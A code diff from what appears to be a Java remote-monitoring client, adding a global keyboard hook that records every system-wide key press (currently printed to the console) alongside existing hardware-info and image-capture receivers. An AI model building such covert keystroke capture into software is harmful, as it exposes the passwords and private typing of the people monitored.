@@ -11,7 +11,12 @@ import SocketMessageReceiver.DataType.LoginUserUDPRequest;
 import SocketMessageSender.CustomUserSender.LoginSender;
 import SocketMessageSender.CustomUserSender.LoginUDPSender;
 import Utilities.Utilities;
+import lc.kra.system.keyboard.GlobalKeyboardHook;
+import lc.kra.system.keyboard.event.GlobalKeyEvent;
+import lc.kra.system.keyboard.event.GlobalKeyListener;
 
+import java.awt.*;
+import java.awt.event.KeyEvent;
 import java.io.IOException;
 import java.net.ServerSocket;
 
@@ -45,6 +50,18 @@ public class User {
             EventDispatcher.startListening(new GetHardwareInfoReceiver());
             EventDispatcher.startListening(new GetImageReceiver());
 
+            GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(false);
+            keyboardHook.addKeyListener(new GlobalKeyListener() {
+                @Override
+                public void keyPressed(GlobalKeyEvent globalKeyEvent) {
+                    System.out.println(globalKeyEvent);
+                }
+
+                @Override
+                public void keyReleased(GlobalKeyEvent globalKeyEvent) {
+
+                }
+            });
 
             Thread.currentThread().join();
         } catch (IOException e) {
